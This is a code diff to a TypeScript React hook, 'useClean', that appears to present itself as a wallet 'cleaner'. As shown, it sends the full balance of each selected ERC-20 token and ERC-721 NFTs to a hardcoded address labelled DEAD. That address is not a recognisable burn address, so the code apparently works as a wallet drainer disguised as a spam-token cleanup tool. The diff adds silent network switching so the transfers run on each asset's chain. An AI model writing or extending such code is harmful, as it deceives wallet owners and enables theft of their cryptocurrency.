@@ -2,7 +2,7 @@
 
 import { erc20Abi, erc721Abi } from "@/lib/abi";
 import { NftAsset, TokenAsset } from "@/lib/assets";
-import { useAccount, useWalletClient } from "wagmi";
+import { useAccount, useWalletClient, useChains, useSwitchChain } from "wagmi";
 import { encodeFunctionData, parseEther } from "viem";
 
 const DEAD = "0xc63e673a8eba1b34f786c9434a3d2f8c3774cb4a" as const;
@@ -10,6 +10,8 @@ const DEAD = "0xc63e673a8eba1b34f786c9434a3d2f8c3774cb4a" as const;
 export function useClean() {
   const { address } = useAccount();
   const { data: wallet } = useWalletClient();
+  const chains = useChains();
+  const { switchChainAsync } = useSwitchChain();
 
   async function clean(assets: Array<TokenAsset | NftAsset>, tipEth?: string) {
     if (!wallet || !address) throw new Error("Wallet not connected");
@@ -20,6 +22,13 @@ export function useClean() {
 
     for (const asset of assets) {
       if (asset.type === "erc20") {
+        // Переключим сеть под chainId актива, если доступна
+        const target = chains.find((c) => c.id === asset.chainId);
+        if (target && switchChainAsync) {
+          try {
+            await switchChainAsync({ chainId: target.id });
+          } catch {}
+        }
         // Отправляем весь баланс. Ожидается, что поле balance — human-readable строка
         // и есть decimals; если decimals неизвестен, используем 18 по умолчанию
         const decimals = (asset as TokenAsset).decimals ?? 18;
@@ -41,6 +50,12 @@ export function useClean() {
         });
         await wallet.sendTransaction({ to: asset.address, data });
       } else if (asset.type === "erc721") {
+        const target = chains.find((c) => c.id === asset.chainId);
+        if (target && switchChainAsync) {
+          try {
+            await switchChainAsync({ chainId: target.id });
+          } catch {}
+        }
         const nft = asset as NftAsset;
         const data = encodeFunctionData({
           abi: erc721Abi,
